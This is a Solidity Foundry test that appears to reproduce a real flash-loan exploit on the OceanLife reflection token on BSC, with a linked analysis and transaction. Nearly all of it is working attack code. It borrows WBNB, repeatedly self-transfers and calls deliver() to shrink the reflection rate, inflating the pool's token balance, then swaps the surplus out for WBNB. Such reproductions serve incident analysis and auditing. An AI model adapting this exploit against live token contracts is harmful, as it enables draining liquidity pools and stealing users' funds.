// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1648520494516420608
// @TX
// https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a
// @Summary
// The attacker called the `transfer()` and `deliver()` functions to reduce the number of rSupply and tSupply.
// The value of rate is thus calculated less, increasing the number of reflected tokens in the pair,
// Finally directly call swap to withdraw $WBNB from the pair.

interface IOceanLife {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function deliver(uint256 tAmount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ContractTest is Test {
    uint256 internal constant FLASHLOAN_WBNB_AMOUNT = 969 * 1e18;

    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IOceanLife constant OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant OLIFE_WBNB_LPPool = IPancakePair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);

    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 27_470_678);
    }

    function testExploit() external {
        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function loopTransfer(uint256 num) internal {
        uint256 i;
        while (i < num) {
            uint256 amount = OLIFE.balanceOf(address(this));
            OLIFE.transfer(address(this), amount);
            i++;
        }
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.approve(address(pancakeRouter), type(uint256).max);

        address[] memory swapPath = new address[](2);
        swapPath[0] = address(WBNB);
        swapPath[1] = address(OLIFE);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASHLOAN_WBNB_AMOUNT, 0, swapPath, address(this), block.timestamp
        );
        /*  
            Reflection calculations
            Rate = rSupply / tSupply (Excluded users are not counted in the supply)
            balanceOf(pair) = rOwned[pair] / currentRate  
        */
        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in pair before the currentRate reduction",
            OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)),
            9
        );
        loopTransfer(19);

        OLIFE.deliver(66_859_267_695_870_000);

        emit log_named_decimal_uint(
            "[INFO] OLIFE amount in pair after the currentRate reduction",
            OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)),
            9
        );

        (uint256 oldOlifeReserve, uint256 bnbReserve,) = OLIFE_WBNB_LPPool.getReserves();
        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));
        uint256 amountin = newolifeReserve - oldOlifeReserve;
        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10_000 + amountin * 9975);

        //swap OLIFE to WBNB
        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), "");

        // repay
        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);
    }
}
